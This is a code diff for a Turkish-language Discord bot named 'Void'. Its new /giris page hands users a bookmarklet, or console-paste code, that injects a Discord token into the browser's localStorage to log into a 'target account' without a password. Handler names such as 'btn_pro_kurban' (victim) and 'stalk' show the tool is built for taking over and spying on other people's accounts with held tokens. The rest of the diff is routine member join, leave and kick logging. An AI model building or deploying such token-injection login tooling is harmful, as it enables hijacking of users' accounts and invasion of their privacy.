@@ -34,10 +34,12 @@ const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => res.send('Void Bot aktif!'));
 
-// ================= YENİ EKLENEN: VOID WEB GİRİŞ SAYFASI =================
+// ================= YENİ: VOID WEB GİRİŞ SAYFASI (YER İMİ SİSTEMLİ) =================
 app.get('/giris', (req, res) => {
     const token = req.query.token;
     if (!token) return res.send('Geçersiz bağlantı. Token bulunamadı.');
+
+    const scriptCode = "(function(){window.t='" + token + "';window.localStorage=document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;window.setInterval(()=>window.localStorage.token='\"'+window.t+'\"');window.location.reload();})();";
 
     const html = `
     <!DOCTYPE html>
@@ -45,29 +47,36 @@ app.get('/giris', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Void | Otomatik Giriş</title>
+        <title>Void | Şifresiz Giriş</title>
         <style>
             body { background-color: #111214; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .container { background-color: #1e1f22; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; max-width: 500px; }
+            .container { background-color: #1e1f22; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; max-width: 500px; border-top: 4px solid #5865F2;}
             h1 { color: #5865F2; margin-bottom: 10px; }
-            p { color: #b5bac1; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
-            .btn { display: inline-block; background-color: #23a559; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: 0.2s; border: none; cursor: pointer; font-size: 16px; }
-            .btn:hover { background-color: #1d8749; }
+            p { color: #b5bac1; font-size: 15px; margin-bottom: 20px; line-height: 1.5; }
+            .bookmark-btn { display: inline-block; background-color: #23a559; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; cursor: grab; font-size: 16px; margin: 15px 0;}
+            .btn { display: inline-block; background-color: #4e5058; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; border: none; cursor: pointer; margin-top: 15px;}
+            .btn:hover { background-color: #6d6f78; }
             .warning { background-color: #da373c; color: white; padding: 10px; border-radius: 5px; margin-top: 20px; font-size: 13px; font-weight: bold; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>Void Hızlı Giriş</h1>
-            <p>Hedef hesaba bağlanmak için aşağıdaki butona tıklayın.<br><br><span style="font-size:12px; color:gray;">(Tıkladığınızda Discord sayfasına yönlendirileceksiniz. Sayfa açıldığında <b>F12 -> Console</b> kısmına otomatik kopyalanan kodu yapıştırıp Enter'a basın.)</span></p>
-            <button class="btn" onclick="copyAndRedirect()">🚀 Bağlantıyı Kur ve Giriş Yap</button>
-            <div class="warning">⚠️ Sadece PC'de geçerlidir. (Telefondan denemeyin)</div>
+            <h1>F12'siz Giriş Yöntemi</h1>
+            <p>F12 ile uğraşmamak için aşağıdaki yeşil butonu farenizle basılı tutun ve tarayıcınızın üstteki <b>Yer İmleri (Sık Kullanılanlar)</b> çubuğuna sürükleyip bırakın.</p>
+            
+            <a href="javascript:${encodeURIComponent(scriptCode)}" class="bookmark-btn">🚀 Void Hesaba Gir</a>
+            
+            <p style="margin-top: 20px; font-size: 14px;">Yer imlerine ekledikten sonra <a href="https://discord.com/login" target="_blank" style="color:#5865F2;">discord.com/login</a> sayfasına gidin ve üstteki çubuktan <b>"🚀 Void Hesaba Gir"</b> yazısına tıklayın. Şifresiz giriş yapılacaktır!</p>
+            
+            <button class="btn" onclick="copyAndRedirect()">Yer imi yapamadım, Kodu Kopyala F12 yapacağım</button>
         </div>
         <script>
             function copyAndRedirect() {
-                const code = '(function(){window.t="${token}";window.localStorage=document.body.appendChild(document.createElement(\\'iframe\\')).contentWindow.localStorage;window.setInterval(()=>window.localStorage.token=\`"\\${window.t}"\`);window.location.reload();})();';
+                const code = ${JSON.stringify(scriptCode)};
                 navigator.clipboard.writeText(code).then(() => {
                     window.location.href = "https://discord.com/login";
+                }).catch(err => {
+                    alert("Kopyalama engellendi. Kodu manuel kopyalayın: " + code);
                 });
             }
         </script>
@@ -76,7 +85,7 @@ app.get('/giris', (req, res) => {
     `;
     res.send(html);
 });
-// =========================================================================
+// =================================================================================
 
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
@@ -298,12 +307,10 @@ client.on('interactionCreate', async interaction => {
     if (interaction.isButton() || interaction.isModalSubmit() || interaction.isStringSelectMenu()) {
         const id = interaction.customId;
 
-        // ============ YENİ: VOID LİNKLİ GİRİŞ SİSTEMİ ============
         if (['btn_void_giris_panel', 'modal_void_giris', 'btn_void_kayitli', 'select_void_kayitli'].includes(id)) {
             const cmd = client.textCommands.get('giris');
             if (cmd && cmd.handleInteraction) return cmd.handleInteraction(interaction);
         }
-        // ==========================================================
 
         if (['btn_pro_sec', 'select_pro_token', 'btn_pro_kurban', 'modal_pro_stalk'].includes(id)) {
             const cmd = client.textCommands.get('profil');
@@ -409,6 +416,76 @@ client.on('interactionCreate', async interaction => {
     const command = client.commands.get(interaction.commandName);
     if (!command) return;
     try { await command.execute(interaction); } catch (e) { console.error(e); }
+});
+
+client.on('guildMemberAdd', async member => {
+    const logCh = member.guild.channels.cache.get("1537947626937262203"); 
+    if (logCh) {
+        const createdAt = parseInt(member.user.createdTimestamp / 1000);
+        const embed = new EmbedBuilder()
+            .setTitle('<a:emoji2:1537948247946174475> Void | Yeni Üye Katıldı!')
+            .setDescription(
+                `<a:emoji109:1537925984882266212> **Kullanıcı Bilgileri:**\n` +
+                `• İsim: ${member} (\`${member.user.tag}\`)\n` +
+                `• ID: \`${member.id}\`\n\n` +
+                `<a:emoji110:1537925433763299418> **Sunucu İstatistikleri:**\n` +
+                `• Sunucudaki **${member.guild.memberCount}**. Üye!\n\n` +
+                `<a:emoji24:1537925080447717447> **Hesap Kurulum Tarihi:**\n` +
+                `• <t:${createdAt}:R> (<t:${createdAt}:F>)`
+            )
+            .setColor('#2b2d31')
+            .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
+            .setTimestamp();
+        logCh.send({ embeds: [embed] }).catch(()=>{});
+    }
+
+    try {
+        const dmEmbed = new EmbedBuilder()
+            .setTitle('<a:emoji58:1537925046486433802> Void Sunucusuna Hoş Geldin! <a:emoji24:1537925080447717447>')
+            .setDescription('<a:emoji109:1537925984882266212> Sunucumuza katıldığın için teşekkürler!\n<a:emoji110:1537925433763299418> Lütfen kuralları okumayı unutma, keyifli vakit geçirmen dileğiyle.')
+            .setColor('#2b2d31');
+        await member.send({ embeds: [dmEmbed] });
+    } catch (e) {}
+});
+
+client.on('guildMemberRemove', async member => {
+    let isKick = false;
+    let executor = "Bilinmiyor", reason = "Belirtilmedi";
+    try {
+        const auditLogs = await member.guild.fetchAuditLogs({ limit: 1, type: AuditLogEvent.MemberKick });
+        const kickLog = auditLogs.entries.first();
+        if (kickLog && kickLog.target.id === member.id && kickLog.createdAt > Date.now() - 5000) {
+            isKick = true; executor = kickLog.executor.tag; if (kickLog.reason) reason = kickLog.reason;
+        }
+    } catch(e) {}
+
+    if (isKick) {
+        const logCh = member.guild.channels.cache.get("1537983422079963146"); 
+        if (logCh) {
+            const embed = new EmbedBuilder()
+                .setTitle('<a:emoji58:1537925046486433802> Void | Kick Raporu')
+                .setColor('#2b2d31')
+                .setDescription(`<a:emoji109:1537925984882266212> **Kullanıcı:** ${member.user.tag}\n<a:emoji110:1537925433763299418> **Yetkili:** ${executor}\n<a:emoji24:1537925080447717447> **Sebep:** ${reason}`)
+                .setTimestamp();
+            logCh.send({ embeds: [embed] }).catch(()=>{});
+        }
+    } else {
+        const leaveLogCh = member.guild.channels.cache.get("1537947723708506153"); 
+        if (leaveLogCh) {
+            const embed = new EmbedBuilder()
+                .setTitle('<a:emoji1:1537948121336909865> Void | Üye Ayrıldı!')
+                .setDescription(
+                    `<a:emoji109:1537925984882266212> **Kullanıcı Bilgileri:**\n` +
+                    `• İsim: \`${member.user.tag}\`\n` +
+                    `• ID: \`${member.id}\`\n\n` +
+                    `<a:emoji110:1537925433763299418> Sunucudan ayrıldı. Kalan üye sayısı: **${member.guild.memberCount}**`
+                )
+                .setColor('#2b2d31')
+                .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
+                .setTimestamp();
+            leaveLogCh.send({ embeds: [embed] }).catch(()=>{});
+        }
+    }
 });
 
 client.login(process.env.TOKEN);
